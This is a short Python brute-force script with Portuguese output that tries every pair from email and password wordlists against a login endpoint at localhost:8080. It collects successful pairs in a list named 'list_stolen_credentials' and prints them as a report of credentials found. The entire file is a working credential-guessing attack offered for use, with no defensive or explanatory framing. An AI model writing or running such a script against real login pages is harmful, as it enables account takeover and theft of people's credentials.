#-- coding:utf-8 --
#!/usr/bin/python
import requests
import time
import datetime

url = "http://localhost:8080/login"
list_stolen_credentials = [{}]
start = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

def request(mail, password):
    auth = (mail,  password)
    response = requests.post(url, auth=auth)
    if not response.text:
        now = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        print(now + "\nemail e senha não combinam!")
    else:
        now = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        print(now + "\nOpa, temos uma combinação aqui!!"
        + "\n\nEmail: " + mail + "\n"
        + "Senha: " + password)
        credentials = { ( now, mail, password ) }
        list_stolen_credentials.append(credentials)
        return True

mails = open("mail.txt").read().splitlines()
passwords = open("passwd.txt").read().splitlines()

for mail in mails:
    for passwd in passwords:  
        print("testando email '{}' com senha: {}\n".format(mail, passwd))
        response = request(mail, passwd)
        print("\n" + '=' * 35 + "\n")
        time.sleep(0.5)
        if response is True:
            break

finish = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
print(' ' * 15 + "LISTA DE CREDENCIAIS")
print('=' * 50)
print('\n  INICIO DO BRUTE FORCE: ' + start +  "\n  FIM DO BRUTE FORCE: " + finish + '\n')
print('=' * 50)
for index, credential in enumerate(list_stolen_credentials):
    for info in credential:
        print("\n  {} -     {}\n  EMAIL: {}  SENHA: {}\n".format(index, info[0], info[1], info[2]))
        print('=' * 50)